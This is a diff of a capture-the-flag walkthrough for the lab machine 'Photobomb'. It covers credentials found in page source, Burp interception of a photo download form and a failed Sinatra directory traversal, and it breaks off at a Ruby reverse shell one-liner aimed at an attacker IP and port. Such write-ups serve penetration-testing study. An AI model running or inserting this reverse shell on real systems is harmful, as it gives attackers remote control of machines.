@@ -25,11 +25,39 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 18.92 seconds
 ```
 
-
-
+Accessing the webpage and looking at the source code we can find a username and password. ```pH0t0:b0Mb!```
 
 http://pH0t0:b0Mb!@photobomb.htb/printer
 
+
+![image](https://user-images.githubusercontent.com/105310322/195695976-b76720b2-7e3e-4d69-ab9d-9a08f19ac0ca.png)
+
+Next we come to a page with pictures and a download section.
+
+![image](https://user-images.githubusercontent.com/105310322/195698235-51057170-a92d-4bf5-b0be-7c14975b6f8f.png)
+
+
+Before we get the the actual attack vector I tried a couple of different things.
+
+In burp if we intercept the download page and get rid of fields except for the picture and then send it. This will actually bring us to a page that gives lots of information about what the webapp is running.
+
+![image](https://user-images.githubusercontent.com/105310322/195699039-242afef3-3cf7-4eab-a376-e9d8f59e9b44.png)
+
+
+I started with trying to exploit Sinatra with a directory traversal but the page confirmed that their were protections in place against it.
+
+![image](https://user-images.githubusercontent.com/105310322/195699527-fc9a80e0-0ad5-46d3-90f9-037f80d8b313.png)
+
+Also by trying to access other directories it will bring us to this page that confirms it is running Sinatra.
+
+http://photobomb.htb/printerfriendly
+
+![image](https://user-images.githubusercontent.com/105310322/195699688-cec33e27-e9d5-42c7-9000-94a8cc72ee7f.png)
+
+Now on to the actual Attack Vector!
+
+
+In BurpSuite intercept the ```Download Photo To Print```
 
 
 ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.16.11",1234))'
